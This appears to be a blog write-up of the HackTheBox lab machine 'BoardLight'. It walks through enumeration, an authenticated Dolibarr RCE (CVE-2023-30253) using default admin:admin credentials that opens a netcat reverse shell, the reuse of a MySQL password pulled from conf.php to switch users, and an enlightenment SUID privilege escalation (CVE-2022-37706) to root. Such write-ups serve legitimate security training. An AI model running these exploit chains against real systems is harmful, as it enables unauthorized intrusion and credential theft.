---
layout: single
title:  "HackTheBox - BoardLight"
categories: 
  - HTB Easy
tags:
  - htb
  - htb-easy
toc: true
toc_label: "Contents"
toc_icon: "list"  # corresponding Font Awesome icon name (without fa prefix)
excerpt: ""
author_profile: false
sidebar:
  nav: "navbar"
---

## Initial Enumeration

`nmap -sC -sV -v -p- --min-rate=1000 10.10.11.11 -oA nmap/boardlight`

```
Nmap scan report for 10.10.11.11
Host is up (0.0080s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Since a HTTP web server is online, we can try to visit the website and have a look around.

* We will find a "Contact Us" page with a form, which is interesting.
* However, if we intercept the outgoing form traffic using `Burpsuite`, we find that this is a dead end, as the form submission simply leads to another GET request on the same web page, effectively refreshing the web page after each form submission.
* There is no PUT or POST request being done, which means that form injection is not likely here.

In the meantime, we can conduct more web enumeration.

Firstly, if we try DNS enumeration, we find that there is nothing of note.

* Reverse, NS and AXFR look-ups do not yield any result.

Next, we can try to enumerate subdomains with `ffuf`:

`ffuf -u http://10.10.11.11/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt`

* However, we find that this does not yield any interesting result either.

Finally, we can try to enumerate vHosts. Firstly, update `/etc/hosts` to resolve `board.htb` to `10.10.11.11`.

Then, run `ffuf` to enumerate vHosts:

`ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "HOST: FUZZ.board.htb" -u http://10.10.11.11 -fs 15949`

```
<SNIP>
 :: Method           : GET
 :: URL              : http://10.10.11.11
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.board.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 15949
________________________________________________

crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 60ms]
:: Progress: [4989/4989] :: Job [1/1] :: 1739 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
<SNIP>
```

We have thus found a `crm` sub-domain through vHost enumeration.

* Again, make sure to resolve `crm.board.htb` to the same IP address.

## Foothold

If we visit `crm.board.htb`, we see that it is a login page for `Dolibarr`, an ERP/CRM software. The version is explicitly stated on the web page as **17.0.0**.

Doing a quick Google search yields a CVE for this version of Dolibarr: CVE-2023-30253.

* In this exploit, RCE can be achieved by an authenticated user, by changing a PHP header value to uppercase.

As we need some credentials for this exploit, we can run another search to look for default `Dolibarr` credentials.

* We will find that some default credentials are `admin:admin` and `admin:changeme`.
* We will attempt to use the first credential set.

To run this exploit, we will use a PoC from GitHub.

On one terminal window, we will start a listener: `nc -lnvp 4444`

Then, run the exploit in a separate window:

```
$ python3 exploit.py http://crm.board.htb admin admin 10.10.14.23 4444
[*] Trying authentication...
[**] Login: admin
[**] Password: admin
[*] Trying created site...
[*] Trying created page...
[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
[!] If you have not received the shell, please check your login and password
```

```
$ nc -lnvp 4444                                                  
listening on [any] 4444 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.11.11] 33634
bash: cannot set terminal process group (895): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ whoami
whoami
www-data
```

Now that we have a foothold on the machine (as `www-data`), we can try to move laterally to grab the user flag.

If we run `ls -la /home/`, we see a home directory for a `larissa` user.

To confirm, we can run `cat /etc/passwd | grep bash` to ensure that `larissa` is the user we are looking for.

```
www-data@boardlight:~$ cat /etc/passwd | grep bash
cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
larissa:x:1000:1000:larissa,,,:/home/larissa:/bin/bash
```

Hence, we know that `larissa` is the user of interest here.

As `www-data`, we have access to the configuration files for the `Dolibarr` instance. If we run a quick Google search, we find that default credentials can be found in the `conf.php` file at `~/html/crm.board.htb/htdocs/conf`.

If we look into `conf.php`, we find some `MySQL` DB credentials.

```
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat conf.php
<SNIP>
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
<SNIP>
```

We thus note down a credential set that can be used:
`dolibarrowner:serverfun2$2023!!`

We can try to log into MySQL using these credentials. Then, use the `dolibarr` DB and look for tables of interest.

```
mysql> use dolibarr
use dolibarr
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+-------------------------------------------------------------+
| Tables_in_dolibarr                                          |
+-------------------------------------------------------------+
<SNIP>
| llx_tva                                                     |
| llx_user                                                    |
| llx_user_alert                                              |
| llx_user_clicktodial                                        |
| llx_user_employment                                         |
| llx_user_extrafields                                        |
| llx_user_param                                              |
| llx_user_rib                                                |
| llx_user_rights                                             |
| llx_usergroup                                               |
| llx_usergroup_extrafields                                   |
| llx_usergroup_rights                                        |
| llx_usergroup_user                                          |
<SNIP>
```

If we view the `llx_user` table, we find some password hashes for the `dolibarr` and `admin` users. However, there is not much point in cracking these as they are credentials for the web application.

* We also note that these passwords cannot be cracked normally.

Since we have the default DB admin password, we can try to check for password reuse.

If we try to `su` as `larissa` using the `MySQL` DB admin password, we will successfully login.

```
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ su larissa
su larissa
Password: serverfun2$2023!!

larissa@boardlight:/var/www/html/crm.board.htb/htdocs/conf$ whoami
whoami
larissa
```

We can thus capture the user flag.

```
larissa@boardlight:/var/www/html/crm.board.htb/htdocs/conf$ cd ~    
cd ~
larissa@boardlight:~$ cat user.txt
cat user.txt
47262ac13983888e58f4eb9850ee0b87
```

## Privilege Escalation

If we try to `sudo -l`, we find that `larissa` has no `sudo` permissions.

We can download `linpeas` on the host and run it to check for privilege escalation paths.

From `linpeas`, we note the potential CVEs for privilege escalation:

```
[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: probable
   Tags: [ ubuntu=(20.04|21.04) ],debian=11
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded
```

Next, we note down `larissa`'s group memberships:
`uid=1000(larissa) gid=1000(larissa) groups=1000(larissa),4(adm)`

* We note that `larissa` is in the `adm` group, which grants access to view `syslogs`.
* However, this is a dead end.

Finally, we want to note down the files with interesting permissions:

```
<SNIP>
-rwsr-xr-x 1 root root 27K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight (Unknown SUID binary!)
-rwsr-xr-x 1 root root 15K Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset (Unknown SUID binary!)
<SNIP>
```

Crucially, we note that the `enlightenment` binary contains SUID binaries `backlight`, `ckpasswd` and `sys`.

* SUID binaries are dangerous, as these binaries are always run in the `root` context, irrespective of the user executing it.

If we run a quick Google search, we find CVE-2022-37706, which is an exploit that targets the `enlightenment_sys` SUID binary.

* This exploit attempts to gain a root shell through the SUID binary.

We will thus get the PoC exploit from GitHub. Then, we run the exploit.

```
larissa@boardlight:~$ ./exploit.sh
./exploit.sh
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...
[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can't find in /etc/fstab.
# whoami
whoami
root
```

Finally, since we have `root`, we can get the root flag.

```
# cd /root/
cd /root/
# cat root.txt
cat root.txt
d140386e0be933831ac3f0c7af535c56
```
